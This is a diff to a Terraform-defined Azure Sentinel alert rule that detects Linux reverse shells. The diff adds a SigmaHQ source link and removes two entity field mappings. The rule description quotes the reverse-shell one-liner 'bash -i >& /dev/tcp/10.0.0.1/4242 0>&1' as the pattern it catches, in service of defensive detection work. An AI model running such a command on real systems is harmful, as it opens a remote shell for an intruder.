@@ -2,7 +2,7 @@ resource "azurerm_sentinel_alert_rule_scheduled" "linux_reverse_shell_indicator"
   name                       = "linux_reverse_shell_indicator"
   log_analytics_workspace_id = var.workspace_id
   display_name               = "Linux Reverse Shell Indicator"
-  description                = "Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')"
+  description                = "Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1') | Source: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/linux_reverse_shell_indicator.yml"
   severity                   = "High"
   query                      = <<QUERY
 DeviceNetworkEvents
@@ -48,14 +48,6 @@ QUERY
     field_mapping {
       identifier  = "Sid"
       column_name = "InitiatingProcessAccountSid"
-    }
-    field_mapping {
-      identifier  = "UPNSuffix"
-      column_name = "InitiatingProcessAccountUpn"
-    }
-    field_mapping {
-      identifier  = "AadUserId"
-      column_name = "InitiatingProcessAccountObjectId"
     }
   }
 
